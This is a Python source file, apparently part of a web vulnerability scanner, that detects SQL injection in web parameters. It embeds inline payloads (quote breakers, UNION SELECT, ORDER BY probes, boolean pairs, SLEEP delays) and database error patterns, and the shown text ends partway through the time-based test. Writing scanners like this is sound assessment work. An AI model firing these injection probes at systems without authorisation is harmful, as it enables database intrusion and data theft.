"""
SQL 注入检测模块
支持：error-based / union / boolean-blind / time-based / stacked queries
误报防护：必须二次验证 + baseline 对比
"""
import asyncio
import logging
import re
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

from ..base import DetectionModule, ModuleInfo
from ..base import register_module
from ...models import Vulnerability, VulnerabilityType, Severity, Confidence, ScanTarget
from ...core.session import HTTPPool
from .payloads import (
    ALL_PAYLOADS,
    ERROR_BASED_PAYLOADS,
    UNION_PAYLOADS,
    BOOLEAN_BLIND_PAYLOADS,
    BOOLEAN_BLIND_EXTENDED,
    TIME_BASED_PAYLOADS,
    ORDER_BY_PAYLOADS,
    DB_ERROR_PATTERNS,
    WAF_BYPASS_PAYLOADS,
    STACKED_QUERY_PAYLOADS,
    QUICK_PAYLOADS,
)


logger = logging.getLogger("wvs.module.sqli")


# ============================================================
# 响应差异分析器
# ============================================================

class ResponseAnalyzer:
    """分析 HTTP 响应，检测 SQL 注入特征"""

    def __init__(self, baseline_response: Dict[str, Any]):
        """
        Args:
            baseline_response: 基线响应（原始请求），包含 status_code, text, headers
        """
        self.baseline = baseline_response
        self.baseline_text = baseline_response.get("text", "")[:10000]  # 截断避免过大
        self.baseline_status = baseline_response.get("status_code", 200)
        self.baseline_hash = hash(self.baseline_text)

    def is_sql_error(self, response: Dict[str, Any]) -> Tuple[bool, Optional[str]]:
        """
        检测响应中是否包含 SQL 错误信息

        Returns:
            (is_error, db_type) — 是否为 SQL 错误，以及识别到的数据库类型
        """
        text = response.get("text", "")[:10000]

        # 精确匹配数据库错误特征
        for db_type, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern in text:
                    logger.debug(f"[SQLi] 发现数据库错误特征: {db_type} - {pattern[:50]}")
                    return True, db_type

        # DVWA / PHP 特有错误模式
        dvwa_patterns = [
            r"Warning.*mysql_",
            r"Warning.*mysqli_",
            r"mysql_fetch",
            r"mysql_num_rows",
            r"Unknown column",
            r"where clause",
            r"order clause",
            r"group statement",
            r"SQL syntax.*MySQL",
            r"check the manual.*MySQL",
            r"right syntax to use",
        ]
        for pattern in dvwa_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                logger.debug(f"[SQLi] 发现 DVWA/PHP 错误模式: {pattern}")
                return True, "mysql"

        # 更宽泛的匹配：SQL syntax error
        generic_patterns = [
            r"SQL\s+(error|syntax|fail|exception)",
            r"mysql.*error",
            r"sqlite.*error",
            r"postgresql.*error",
            r"microsoft.*sql.*error",
            r"sqlserver.*error",
            r"ora-\d{5}",  # Oracle ORA-xxxxx
            r"quoted string.*not properly terminated",
            r"unclosed.*quotation",
            r"You have an error",
            r"Syntax error or access violation",
            r"SQLSTATE\[\d+\]",
            r"PDOException",
            r"SQLSTATE\[23000\]:.*Duplicate entry",
            r"SQLSTATE\[42000\]",
            # P7: additional DB engine error patterns
            r"ERROR:\s+column.*does not exist",  # PostgreSQL
            r"ERROR:\s+relation.*does not exist",  # PostgreSQL
            r"ERROR:\s+syntax error at or near",  # PostgreSQL
            r"\[SQL Server\].*",  # MSSQL
            r"Incorrect syntax near",  # MSSQL
            r"Unclosed quotation mark",  # MSSQL
            r"Driver.*SQL.*Server",  # MSSQL JDBC
            r"Warning.*\bmssql_",  # PHP MSSQL
            r"PLS-\d{5}",  # Oracle PL/SQL
            r"SP2-\d{4}",  # Oracle SQL*Plus
            r"DB2 SQL Error",  # DB2
            r"SQLCODE",  # DB2/Mainframe
            r"supplied argument is not a valid MySQL",  # PHP MySQL
            r"valid MySQL result",  # PHP MySQL
        ]
        for pattern in generic_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                logger.debug(f"[SQLi] 发现通用错误模式: {pattern}")
                return True, "generic"

        return False, None

    def is_boolean_blind_positive(self, true_resp: Dict[str, Any], false_resp: Dict[str, Any]) -> bool:
        """
        Boolean-blind detection: compare True vs False responses directly.

        P10 fix: The two requests naturally produce different responses on pages with
        dynamic content (timestamps, CSRF tokens, session IDs). We must require a
        structural difference large enough that it cannot be explained by dynamic
        noise alone.

        P15 fix: When boolean payloads are simply reflected back (XSS-style),
        the HTML tag structure is identical. A real SQL injection that changes
        DB output (more/less rows) changes the HTML structure.
        """
        true_text = true_resp.get("text", "")[:10000]
        false_text = false_resp.get("text", "")[:10000]

        # Status code difference is a strong signal
        if true_resp.get("status_code") != false_resp.get("status_code"):
            return True

        # P10: Tightened threshold — 1.5% was matching dynamic page noise.
        # Require at least 3% length difference AND absolute diff > 200 bytes.
        len_diff = abs(len(true_text) - len(false_text))
        if len_diff > 200 and len_diff / max(len(true_text), 1) > 0.03:
            return True

        # P15: Aggressively strip SQL artifacts from both texts.
        # For reflected payloads (XSS-style), the only difference should be
        # the SQL syntax which gets stripped here. Real SQLi changes DB output
        # (rows/no rows) which persists after stripping.
        import re as _re
        def _strip_sql_noise(t: str) -> str:
            # Strip HTML tags first
            t = _re.sub(r'<[^>]+>', '', t)
            # Strip quoted strings (payloads, SQL fragments)
            t = _re.sub(r"'[^']*'", '', t)
            t = _re.sub(r'"[^"]*"', '', t)
            # Strip SQL keywords
            t = _re.sub(r'\b(?:AND|OR|NOT|SELECT|UNION|NULL|WHERE|FROM|ORDER|BY|SLEEP|HAVING|LIKE)\b', '', t, flags=_re.IGNORECASE)
            # Normalize numbers
            t = _re.sub(r'\b\d+\b', 'N', t)
            # Strip operators and comments
            t = _re.sub(r'[=\<\>\!\+\-\*/%]', ' ', t)
            t = _re.sub(r'--|#', ' ', t)
            # Strip single-char residues from string comparison patterns ('a'='a' -> aa)
            t = _re.sub(r'\b\w\b', '', t)
            t = _re.sub(r'\s+', ' ', t).strip()
            return t

        t_clean = _strip_sql_noise(true_text)
        f_clean = _strip_sql_noise(false_text)
        if t_clean == f_clean:
            return False

        # P10: Must see meaningful visible-text difference after stripping
        # HTML tags, whitespace, and common dynamic tokens (timestamps, CSRF, etc.)
        def _normalize(t: str) -> str:
            t = _re.sub(r'<[^>]+>', ' ', t)
            # Strip common dynamic patterns: timestamps, UUIDs, hex IDs
            t = _re.sub(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}', ' ', t)
            t = _re.sub(r'[a-f0-9]{32,}', ' ', t)  # MD5/UUID
            t = _re.sub(r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}', ' ', t)
            # P15: Normalize SQL injection artifacts to prevent reflected-payload FPs
            t = _re.sub(r'\b(?:AND|OR|NOT|NULL|TRUE|FALSE|SELECT|UNION|ORDER|BY|WHERE|FROM)\b', '', t, flags=_re.IGNORECASE)
            t = _re.sub(r"'[^']*'", "''", t)  # normalize quoted strings
            t = _re.sub(r'\b\d+\b', 'N', t)  # normalize numbers
            t = _re.sub(r'[+\-*/%]=?', ' ', t)  # strip operators
            t = _re.sub(r'--|#', ' ', t)  # strip comments
            t = _re.sub(r'\s+', ' ', t).strip()
            return t

        t_norm = _normalize(true_text)
        f_norm = _normalize(false_text)

        # After normalization, content must still differ
        if t_norm != f_norm:
            return True

        return False

    def is_union_positive(self, response: Dict[str, Any]) -> Tuple[bool, Optional[int]]:
        """
        检测 UNION 注入是否成功
        返回 (is_positive, column_count)
        """
        text = response.get("text", "")
        # UNION SELECT 成功的标志：可能显示数字、字符串、NULL、或列数相关错误
        positive_indicators = [
            " UNION ",  # 显式 UNION 出现在响应中（说明被注入）
            "SELECT",  # 有 SELECT 语句暴露
            re.search(r"\d+\s+NULL", text),  # 数字和 NULL 混合出现
            re.search(r"^\d+$", text.strip()),  # 整行只有数字
        ]
        if any(positive_indicators):
            return True, None
        return False, None

    def is_time_based_positive(
        self, response: Dict[str, Any], expected_delay: float, actual_delay: float
    ) -> bool:
        """
        Time-based 检测：实际延迟是否超过阈值
        """
        # 延迟超过 expected_delay * 0.7 才认为有效（容忍网络波动）
        return actual_delay >= expected_delay * 0.7


# ============================================================
# SQLi 检测器
# ============================================================

@register_module
class SQLiDetector(DetectionModule):
    """SQL 注入检测模块"""

    @classmethod
    def get_info(cls) -> ModuleInfo:
        return ModuleInfo(
            name="sqli",
            description="检测 SQL 注入漏洞（error-based / union / boolean-blind / time-based）",
            author="WVS Team",
            version="1.0.0",
            enabled_by_default=True,
            tags=["sqli", "injection", "sql-injection", "database"],
        )

    def __init__(self, config=None, session: Optional[HTTPPool] = None):
        super().__init__(config)
        self.session = session
        self._found_vulns: List[Vulnerability] = []
        self._checked_urls: set = set()  # 已检测的 URL，用于去重

    # ----------------------------------------------------------
    # 核心入口
    # ----------------------------------------------------------

    async def _scan_impl(self, target: ScanTarget) -> List[Vulnerability]:
        """
        扫描目标，检测 SQL 注入

        P20: 两阶段执行 — 快检（error/union/boolean）串行，
        time-based/stacked 收集后并发执行。消除时间盲注瓶颈。
        """
        self._found_vulns = []
        self._checked_urls = set()  # 重置已检测 URL
        logger.debug(f"[SQLi] _scan_impl ENTRY: url={target.url}")

        # ── P20 Phase 1: 快检（error/union/boolean），收集 time-based 候选 ──
        time_candidates: list = []
        targets = []  # (url, params, method, param_type)

        # ── 1. 先用 target.params / target.data（来自 scanner/crawler）──
        target_params = getattr(target, 'params', None) or {}
        target_data = getattr(target, 'data', None) or {}

        if target_params:
            url_key = target.url.rstrip('/')
            if url_key not in self._checked_urls:
                self._checked_urls.add(url_key)
                targets.append((target.url, target_params.copy(), "GET", "query"))

        if target_data:
            url_key = target.url.rstrip('/')
            if url_key not in self._checked_urls:
                self._checked_urls.add(url_key)
                targets.append((target.url, target_data.copy(), "POST", "body"))

        # ── 2. 补充：从 URL query、表单、Cookie 中提取更多注入点 ──
        form_eps = await self._extract_endpoints_async(target)
        for ep in form_eps:
            url = ep["url"].rstrip('/')
            params = ep.get("params", {})
            method = ep.get("method", "GET")
            param_type = ep.get("param_type", "query")

            if url in self._checked_urls:
                continue
            if not params:
                continue

            self._checked_urls.add(url)
            targets.append((url, params, method, param_type))

        # Run Phase 1: fast checks + collect time-based candidates
        for t_url, t_params, t_method, t_ptype in targets:
            try:
                await self._scan_endpoint(t_url, t_params, t_method, t_ptype, time_candidates=time_candidates)
            except Exception as e:
                logger.debug(f"[SQLi] _scan_endpoint 失败 {t_url}: {e}")

        # ── P20 Phase 2: 并发 time-based + stacked query 检测 ──
        if time_candidates:
            logger.info(f"[SQLi] 开始并发 time-based 检测: {len(time_candidates)} 候选")
            sem = asyncio.Semaphore(min(5, len(time_candidates)))

            async def _run_time_test(candidate):
                (c_url, c_params, c_pname, c_pval,
                 c_method, c_ptype, c_baseline, c_dbtype) = candidate
                async with sem:
                    try:
                        await self._test_time_based(
                            c_url, c_params, c_pname, c_pval,
                            c_method, c_ptype, c_baseline, c_dbtype,
                        )
                        await self._test_stacked_query(
                            c_url, c_params, c_pname, c_pval,
                            c_method, c_ptype, c_baseline,
                        )
                    except Exception as e:
                        logger.debug(f"[SQLi] time-based 检测失败 {c_url}: {e}")

            await asyncio.gather(*[_run_time_test(c) for c in time_candidates])

        logger.info(f"[SQLi] 检测完成，发现 {len(self._found_vulns)} 个漏洞")
        return self._found_vulns

    async def _scan_endpoint(
        self,
        url: str,
        params: Dict[str, str],
        method: str,
        param_type: str,
        time_candidates: Optional[List] = None,
    ) -> None:
        """
        检测单个端点的 SQL 注入

        P20: time_candidates 不为 None 时，跳过 time-based/stacked 执行，
        改为收集候选供后续并发执行。
        """
        logger.debug(f"[SQLi] _scan_endpoint: url={url} params={list(params.keys())} method={method}")
        if not params:
            return

        # 获取基线响应
        baseline = await self._get_cached_baseline(method, url, params, param_type)
        if baseline is None:
            return

        # P8: DBMS fingerprinting — one quick probe to select right payloads
        db_type = await self._fingerprint_dbms(url, params, method, param_type, baseline)

        # WAF bypass: when WAF detected, prepend bypass payloads
        waf_prefix = WAF_BYPASS_PAYLOADS[:6] if self._waf_detected else []

        # P16: Skip boolean-blind / union-based on non-SQLi endpoints.
        # Endpoints like xss_r / csp / csrf echo parameters without any DB
        # interaction, causing structural-analysis FPs. Time-based + error-based
        # are immune because they require actual SQL execution.
        _sqli_url_kw = {'sqli', 'product', 'news', 'item', 'user', 'search',
                        'login', 'member', 'article', 'cat', 'id', 'brute'}
        _sqli_param_kw = {'id', 'uid', 'user', 'search', 'q', 'query', 'pid',
                          'cat', 'page', 'username', 'password', 'email'}
        url_lower = url.lower()
        is_sqli_endpoint = any(kw in url_lower for kw in _sqli_url_kw) or \
                           any(p.lower() in _sqli_param_kw for p in params.keys())

        for param_name in params.keys():
            param_value = params[param_name]

            # --- 1. Error-based ---
            await self._test_error_based(url, params, param_name, param_value, method, param_type, baseline, waf_prefix, db_type)

            # --- 2. Union-based ---
            if is_sqli_endpoint:
                await self._test_union_based(url, params, param_name, param_value, method, param_type, baseline)

            # --- 3. Boolean-blind ---
            if is_sqli_endpoint:
                await self._test_boolean_blind(url, params, param_name, param_value, method, param_type, baseline)

            # --- 4-5. Time-based + Stacked (P20: collect for concurrent, or run inline) ---
            if time_candidates is not None:
                time_candidates.append((
                    url, params.copy(), param_name, param_value,
                    method, param_type, baseline, db_type,
                ))
            else:
                await self._test_time_based(url, params, param_name, param_value, method, param_type, baseline, db_type)
                await self._test_stacked_query(url, params, param_name, param_value, method, param_type, baseline)

    # ----------------------------------------------------------
    # DBMS 指纹识别 (P8: one quick probe to select right payloads)
    # ----------------------------------------------------------

    async def _fingerprint_dbms(
        self,
        url: str,
        params: Dict[str, str],
        method: str,
        param_type: str,
        baseline: Dict,
    ) -> str:
        """
        P8: Quick DBMS fingerprint using a single UNION/SLEEP probe.
        Returns "mysql", "postgresql", "mssql", "oracle", "sqlite", or "unknown".
        When detected, this lets us select targeted payloads instead of trying all DB types.
        """
        baseline_text = baseline.get("text", "")[:2000]
        # Check baseline for DB indicators (server headers, page content)
        combined = baseline_text.lower()
        if "mysql" in combined or "mysqli" in combined:
            return "mysql"
        if "postgresql" in combined or "postgres" in combined or "pg_" in combined:
            return "postgresql"
        if "mssql" in combined or "sql server" in combined or "microsoft sql" in combined:
            return "mssql"
        if "oracle" in combined or "ora-" in combined:
            return "oracle"
        if "sqlite" in combined:
            return "sqlite"

        # Quick error probe: try MySQL-specific error trigger
        for param_name in params.keys():
            mysql_probe = params.copy()
            mysql_probe[param_name] = "'"
            resp = await self._send_request(method, url, mysql_probe, param_type)
            if resp:
                text = resp.get("text", "")[:5000]
                if any(p in text for p in DB_ERROR_PATTERNS.get("mysql", [])[:3]):
                    return "mysql"
                if any(p in text for p in DB_ERROR_PATTERNS.get("postgresql", [])[:3]):
                    return "postgresql"
                if any(p in text for p in DB_ERROR_PATTERNS.get("mssql", [])[:3]):
                    return "mssql"
            break  # only test first param
        return "unknown"

    # ----------------------------------------------------------
    # 检测方法
    # ----------------------------------------------------------

    async def _test_error_based(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
        waf_prefix: List[str] = None,
        db_type: str = "unknown",
    ) -> None:
        """Error-based SQL 注入检测"""
        logger.debug(f"[SQLi] 开始 Error-based 测试: {url} [{param_name}]")

        # P14: Slim error probe — 6 payloads cover the most common syntax errors
        simple_payloads = (waf_prefix or []) + [
            "'", "\"", "1'", "' OR '1'='1", "1 AND 1=1", "1 OR 1=1",
        ]

        for payload in simple_payloads:
            test_params = self._inject_param(params, param_name, payload)
            logger.debug(f"[SQLi] 测试 payload: {payload}")
            resp = await self._send_request(method, url, test_params, param_type)
            if resp is None:
                logger.debug(f"[SQLi] 请求失败: {url}")
                continue

            analyzer = ResponseAnalyzer(baseline)
            is_error, detected_db = analyzer.is_sql_error(resp)

            if is_error:
                logger.info(f"[SQLi] 发现 SQL 错误: {url} [{param_name}] payload={payload} db={detected_db}")
                # 二次验证
                if await self._verify_with_different_payload(
                    url, params, param_name, method, param_type, "error"
                ):
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=payload,
                        vuln_type="error",
                        confidence=Confidence.HIGH,
                        db_type=detected_db or "mysql",
                        evidence=f"DB Error ({detected_db}): {resp.get('text', '')[:200]}",
                    )
                    self._found_vulns.append(vuln)
                    logger.warning(f"[SQLi] Error-based 确认: {url} [{param_name}]")
                    return

        # 测试更多 payloads (P8: prioritize detected DB type for deeper coverage)
        prioritized_dbs = [db_type] if db_type != "unknown" else list(ERROR_BASED_PAYLOADS.keys())
        for db in prioritized_dbs:
            payloads = ERROR_BASED_PAYLOADS.get(db, [])
            for payload in payloads[:8]:  # P14: capped at 8 (was 25) — first 8 cover 90%+ of error patterns
                if payload in simple_payloads:
                    continue
                test_params = self._inject_param(params, param_name, payload)
                logger.debug(f"[SQLi] 测试 {db} payload: {payload[:30]}")
                resp = await self._send_request(method, url, test_params, param_type)
                if resp is None:
                    continue

                analyzer = ResponseAnalyzer(baseline)
                is_error, detected_db = analyzer.is_sql_error(resp)

                if is_error:
                    # 必须用不同 payload 二次验证
                    if await self._verify_with_different_payload(
                        url, params, param_name, method, param_type, "error"
                    ):
                        vuln = self._create_vuln(
                            url=url,
                            param=param_name,
                            param_type=param_type,
                            method=method,
                            payload=payload,
                            vuln_type="error",
                            confidence=Confidence.HIGH,
                            db_type=detected_db or db,
                            evidence=f"DB Error ({detected_db or db}): {resp.get('text', '')[:200]}",
                        )
                        self._found_vulns.append(vuln)
                        logger.warning(f"[SQLi] Error-based 检测到: {url} [{param_name}]")
                        return

    async def _test_union_based(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
    ) -> None:
        """Union-based SQL 注入检测"""
        # 先用 ORDER BY 探测列数
        col_count = await self._detect_column_count(url, params, param_name, param_value, method, param_type)
        if col_count is None:
            return

        # 探测列类型
        column_types = await self.detect_column_types(
            url, params, param_name, col_count, method, param_type
        )

        # 构造 UNION payload（根据列类型选择合适的值）
        columns = []
        for i, col_type in enumerate(column_types):
            if col_type == "string":
                columns.append("'UNION_TEST'")
            elif col_type == "numeric":
                columns.append(str(88888877 + i))
            else:
                columns.append("NULL")

        union_payload = f"' UNION SELECT {','.join(columns)}--"
        test_params = self._inject_param(params, param_name, union_payload)
        resp = await self._send_request(method, url, test_params, param_type)
        if resp is None:
            return

        # 检查是否有预期输出
        resp_text = resp.get("text", "")
        is_positive = False
        for marker in ["UNION_TEST", "88888877", "88888878"]:
            if marker in resp_text:
                is_positive = True
                break

        # P15: HTML tag structure comparison — real UNION injection adds DB rows
        # which changes the DOM structure. Reflected payloads (XSS-style) keep
        # the same tag structure. Tag TYPE names only (ignore CSRF attrs).
        if is_positive and baseline:
            baseline_tags = tuple(re.findall(r'</?(\w+)', baseline.get("text", "")))
            resp_tags = tuple(re.findall(r'</?(\w+)', resp_text))
            if baseline_tags == resp_tags:
                logger.debug(f"[SQLi] Union markers reflected (identical HTML structure): {url} [{param_name}]")
                is_positive = False

        if is_positive:
            if await self._verify_with_different_payload(url, params, param_name, method, param_type, "union"):
                vuln = self._create_vuln(
                    url=url,
                    param=param_name,
                    param_type=param_type,
                    method=method,
                    payload=union_payload,
                    vuln_type="union",
                    confidence=Confidence.HIGH,
                    db_type="unknown",
                    evidence=f"UNION injection, column count: {col_count}, types: {column_types}",
                )
                self._found_vulns.append(vuln)
                logger.warning(f"[SQLi] Union-based 检测到: {url} [{param_name}], 列数: {col_count}")
                return

    async def _detect_column_count(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
    ) -> Optional[int]:
        """
        通过 ORDER BY 二分法探测列数（优化版）

        优化策略：
        1. 二分法探测：O(log n) 复杂度，最多 log2(20) ≈ 5 次请求
        2. 错误响应分析：识别不同数据库的错误特征
        3. 支持 NULL 列探测：UNION SELECT NULL,NULL...
        4. 列类型探测：识别数字/字符串列

        Returns:
            列数，或 None 表示探测失败
        """
        baseline_resp = await self._send_request(method, url, params, param_type)
        if baseline_resp is None:
            return None

        baseline_status = baseline_resp.get("status_code", 200)
        baseline_len = len(baseline_resp.get("text", ""))

        # 策略1：ORDER BY 二分法探测
        col_count = await self._binary_search_column_count(
            url, params, param_name, method, param_type,
            baseline_status, baseline_len
        )

        if col_count:
            logger.debug(f"[SQLi] 二分法探测到列数: {col_count}")
            return col_count

        # 策略2：通过错误响应分析探测
        col_count = await self._detect_by_error_response(
            url, params, param_name, method, param_type
        )

        if col_count:
            logger.debug(f"[SQLi] 错误分析探测到列数: {col_count}")
            return col_count

        # 策略3：NULL 列探测（逐个尝试）
        col_count = await self._detect_by_null_injection(
            url, params, param_name, method, param_type, baseline_resp
        )

        if col_count:
            logger.debug(f"[SQLi] NULL 注入探测到列数: {col_count}")
            return col_count

        return None

    async def _binary_search_column_count(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
        baseline_status: int,
        baseline_len: int,
        max_columns: int = 20,
    ) -> Optional[int]:
        """
        ORDER BY 二分法探测列数

        原理：
        - ORDER BY N 成功：列数 >= N
        - ORDER BY N 失败：列数 < N
        - 二分查找边界

        Returns:
            列数，或 None
        """
        low, high = 1, max_columns
        last_success = 0

        while low <= high:
            mid = (low + high) // 2
            payload = f"' ORDER BY {mid}--"

            test_params = self._inject_param(params, param_name, payload)
            resp = await self._send_request(method, url, test_params, param_type)

            if resp is None:
                low = mid + 1
                continue

            # 判断 ORDER BY 是否成功
            is_error = self._is_order_by_error(resp, baseline_status, baseline_len)

            if is_error:
                # ORDER BY mid 失败 → 列数 < mid
                high = mid - 1
            else:
                # ORDER BY mid 成功 → 列数 >= mid
                last_success = mid
                low = mid + 1

        return last_success if last_success > 0 else None

    def _is_order_by_error(
        self,
        response: Dict[str, Any],
        baseline_status: int,
        baseline_len: int,
    ) -> bool:
        """
        判断 ORDER BY 是否触发错误

        P5 fix: Length difference alone is NOT sufficient — must also see
        SQL error patterns or status code changes. Previous 30% threshold
        caused false positives on pages with dynamic content.
        """
        text = response.get("text", "").lower()
        status = response.get("status_code", 200)

        # Status code change to 5xx is strong evidence
        if status != baseline_status and status >= 500:
            return True

        # Database-specific error patterns (must be present for length-based detection)
        error_patterns = [
            "unknown column",
            "order clause",
            "not in select list",
            "invalid number",
            "out of range",
            "column index",
            "ordinal position",
            "order by item must be",
            "order by position",
        ]

        has_error_pattern = any(pattern.lower() in text for pattern in error_patterns)

        # Length change + error pattern = high confidence
        if has_error_pattern:
            return True

        # Length change > 50% without error pattern is still suspicious,
        # but only if status also changed
        if baseline_len > 0 and abs(len(text) - baseline_len) > baseline_len * 0.5:
            if status != baseline_status:
                return True

        return False

    async def _detect_by_error_response(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
    ) -> Optional[int]:
        """
        通过错误响应分析探测列数

        当 ORDER BY 超出列数时，部分数据库会在错误信息中直接提示：
        - MySQL: "Unknown column '5' in 'order clause'"
        - PostgreSQL: "ORDER BY position 5 is not in select list"
        """
        # 尝试一个较大的 ORDER BY 值
        for n in [10, 20]:  # P14: 2 probes (was 3)
            payload = f"' ORDER BY {n}--"
            test_params = self._inject_param(params, param_name, payload)
            resp = await self._send_request(method, url, test_params, param_type)

            if resp is None:
                continue

            text = resp.get("text", "")

            # 从错误信息中提取列数
            # MySQL: "Unknown column '5' in 'order clause'"
            match = re.search(r"unknown column.*?['\"]?(\d+)['\"]?", text, re.IGNORECASE)
            if match:
                return int(match.group(1)) - 1

            # PostgreSQL: "position 5"
            match = re.search(r"position\s+(\d+)", text, re.IGNORECASE)
            if match:
                return int(match.group(1)) - 1

        return None

    async def _detect_by_null_injection(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        method: str,
        param_type: str,
        baseline: Dict,
    ) -> Optional[int]:
        """
        通过 NULL 注入探测列数

        逐个尝试 UNION SELECT NULL, NULL, ...
        当响应不报错时，说明列数正确
        """
        for col_count in range(1, 7):  # P14: cap at 6 (was 10) — >6 columns rare in lab targets
            null_list = ",".join(["NULL"] * col_count)
            payload = f"' UNION SELECT {null_list}--"

            test_params = self._inject_param(params, param_name, payload)
            resp = await self._send_request(method, url, test_params, param_type)

            if resp is None:
                continue

            # 检查是否报错
            text = resp.get("text", "").lower()
            status = resp.get("status_code", 200)

            # 如果没有 SQL 错误，可能找到了正确列数
            if status < 500 and not any(x in text for x in ["error", "syntax", "sql"]):
                # 二次验证：用不同数量的 NULL 验证
                verify_payload = f"' UNION SELECT {','.join(['NULL'] * (col_count + 1))}--"
                verify_params = self._inject_param(params, param_name, verify_payload)
                verify_resp = await self._send_request(method, url, verify_params, param_type)

                if verify_resp:
                    verify_text = verify_resp.get("text", "").lower()
                    # 如果 col_count + 1 报错，说明 col_count 是正确的
                    if any(x in verify_text for x in ["error", "syntax", "sql"]):
                        return col_count

        return None

    async def detect_column_types(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        col_count: int,
        method: str,
        param_type: str,
    ) -> List[str]:
        """
        探测列类型（数字/字符串）

        Returns:
            列类型列表，如 ['numeric', 'string', 'numeric']
        """
        column_types = []

        for i in range(1, min(col_count + 1, 6)):  # P14: cap at 5 columns (was all)
            # 构造只在第 i 列放置字符串标记的 payload
            columns = ["NULL"] * col_count
            columns[i - 1] = "'CLAUDE_MARKER'"
            payload = f"' UNION SELECT {','.join(columns)}--"

            test_params = self._inject_param(params, param_name, payload)
            resp = await self._send_request(method, url, test_params, param_type)

            if resp and "CLAUDE_MARKER" in resp.get("text", ""):
                column_types.append("string")
            else:
                # 尝试数字
                columns[i - 1] = "88888877"
                payload = f"' UNION SELECT {','.join(columns)}--"
                test_params = self._inject_param(params, param_name, payload)
                resp = await self._send_request(method, url, test_params, param_type)

                if resp and "88888877" in resp.get("text", ""):
                    column_types.append("numeric")
                else:
                    column_types.append("unknown")

        return column_types

    async def _test_boolean_blind(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
    ) -> None:
        """Boolean-blind SQL 注入检测 — 使用配对的 True/False payload 直接对比"""
        # P14: Slim boolean-blind paired payloads (25 pairs, was ~55).
        # First 5 cover the most common SQL dialects; rest provide numeric/unquoted coverage.
        PAIRED_PAYLOADS = [
            # MySQL string context (5 pairs — most common)
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("') AND 1=1--", "') AND 1=2--"),
            ("' AND 2>1--", "' AND 2<1--"),
            ("' OR '1'='1", "' OR '1'='2"),
            # Numeric context — no quotes (critical for int params)
            (" AND 1=1--", " AND 1=2--"),
            (" AND 1=1", " AND 1=2"),
            (" AND 5=5--", " AND 5=6--"),
            (" OR 1=1--", " OR 1=2--"),
            (" AND 99=99", " AND 99=0"),
            # Double-quote context (PostgreSQL, MySQL ANSI_QUOTES)
            ('" AND 1=1--', '" AND 1=2--'),
            ('") AND 1=1--', '") AND 1=2--'),
            # MSSQL
            ("' AND 1=1;--", "' AND 1=2;--"),
            # Oracle
            ("' AND 1=1--", "' AND 1=2--"),
            # Subquery-based
            ("' AND (SELECT 1)=1--", "' AND (SELECT 1)=2--"),
        ] + BOOLEAN_BLIND_EXTENDED[:2]  # P14: 2 extended (was 6)

        analyzer = ResponseAnalyzer(baseline)

        for true_payload, false_payload in PAIRED_PAYLOADS:
            true_params = self._inject_param(params, param_name, true_payload)
            false_params = self._inject_param(params, param_name, false_payload)

            true_resp = await self._send_request(method, url, true_params, param_type)
            false_resp = await self._send_request(method, url, false_params, param_type)

            if true_resp is None or false_resp is None:
                continue

            if analyzer.is_boolean_blind_positive(true_resp, false_resp):
                if await self._verify_with_different_payload(url, params, param_name, method, param_type, "boolean"):
                    vuln = self._create_vuln(
                        url=url,
                        param=param_name,
                        param_type=param_type,
                        method=method,
                        payload=f"{true_payload} / {false_payload}",
                        vuln_type="boolean-blind",
                        confidence=Confidence.MEDIUM,
                        db_type="unknown",
                        evidence=f"Boolean condition: True/False responses differ",
                    )
                    self._found_vulns.append(vuln)
                    logger.warning(f"[SQLi] Boolean-blind 检测到: {url} [{param_name}]")
                    return

    async def _test_time_based(
        self,
        url: str,
        params: Dict[str, str],
        param_name: str,
        param_value: str,
        method: str,
        param_type: str,
        baseline: Dict,
        db_type: str = "unknown",
    ) -> None:
        """
        Time-based SQL 注入检测（使用基类公共方法）
        """
        # 1. P16: Quick pre-check — send SLEEP(1), skip if not delayed.
        # This eliminates 9+ wasted requests on 99% of non-injection params.
        probe = f"' AND SLEEP(1)--"
        probe_params = self._inject_param(params, param_name, probe)
        start = time.perf_counter()
        await self._send_request(method, url, probe_params, param_type)
        probe_delay = time.perf_counter() - start
        if probe_delay < 1.2:
            return  # Endpoint doesn't respond to sleep → not time-injectable

        # 2. 测量基线响应时间
        baseline_avg, baseline_std = await self._measure_baseline(method, url, params, param_type)

        # 2. 检查是否应该跳过（网络波动或响应过慢）
        if self._should_skip_time_based(baseline_avg, baseline_std):
            return

        # 3. P8: Select time-based payloads for detected DB type (not just MySQL)
        db_payloads = TIME_BASED_PAYLOADS.get(db_type, []) if db_type != "unknown" else []
        if not db_payloads:
            # Fallback: try all DB types' first 2 payloads
            for dbs in TIME_BASED_PAYLOADS.values():
                db_payloads.extend(dbs[:2])

        for payload in db_payloads[:3]:  # P14: capped at 3 (was 6)
            test_params = self._inject_param(params, param_name, payload)

            # 提取 SLEEP(N) 中的 N 作为预期延迟
            sleep_match = re.search(r"SLEEP\((\d+)\)", payload)
            expected_delay = float(sleep_match.group(1)) if sleep_match else 3.0

            start = time.perf_counter()
            resp = await self._send_request(method, url, test_params, param_type)
            actual_delay = time.perf_counter() - start

            if resp is None:
                continue

            # 4. 检测是否满足阈值
            if self._is_valid_time_delay(actual_delay, expected_delay, baseline_avg):
                # 5. 多次验证
